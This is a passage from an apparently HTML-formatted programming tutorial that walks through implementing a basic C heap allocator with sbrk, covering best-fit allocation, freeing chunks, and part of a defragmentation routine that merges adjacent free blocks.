&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;heap_alloc()&lt;/code&gt; function should now look something like this:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Allocates memory on the heap&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Make sure some idiot didn't try to allocate zero bytes of memory.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// If the heap has not been initialized, then initialize it&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Check if a suitable chunk already exists in the linked list.&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// If we found a suitable free chunk in the linked list, then remove&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// that chunk from the linked list of free chunks.&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// If there are no free chunks in the linked list with a big enough&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// size for the requested data, then increase the size of the heap.&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Mark the chunk as not free and return&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next, the heap allocator needs to deal with freeing up used memory. This is done by marking the chunk as free and defragging the entire heap. Note that this is not the most efficient way to go about doing this.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Frees the given block of memory.&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Mark the chunk of memory as free&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_free&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;to_free&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Defrag the heap (will automatically modify linked list)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heap_defrag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Defragmentation does three things in this implementation:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;If two or more free blocks are sitting right next to each other, they will be combined to form one giant free block.&lt;/li&gt;
  &lt;li&gt;If a free block is sitting at the end of the heap, then the program break will be reduced so that the free blocks are deleted.&lt;/li&gt;
  &lt;li&gt;The entire linked list of free blocks will be reconstructed.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To complete requirements 1 and 3, the defragmentation algorithm must start at the beginning of the heap and loop through every chunk. It must also store the last free chunk it saw. For every free chunk, the defragmentation algorithm will do the following:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Check if the current chunk is adjacent to the last free chunk it saw. If so, increment the size of the last free chunk so that it “gobbles up” the current chunk.&lt;/li&gt;
  &lt;li&gt;Else, add the current chunk to the linked list.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If there are no free chunks in the linked list, then the algorithm will just make the current chunk the head of the linked list. The first part of the defragmentation algorithm is shown below. Note that the implementation “loops through” the chunks by adding the size of the current chunk to a pointer to the current chunk.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Loop through every chunk&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Check if this is a free chunk&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If there is no linked list, then make this the head&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Save the last free chunk&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Else, add the chunk to the linked list&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Check if the current chunk is adjacent to the last free&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// chunk that we stored.&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// Instead of adding this chunk to the linked list, just&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// increase the size of the last free chunk.&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// If chunks aren't adjacent, then just add the current&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// chunk to the linked list.&lt;/span&gt;
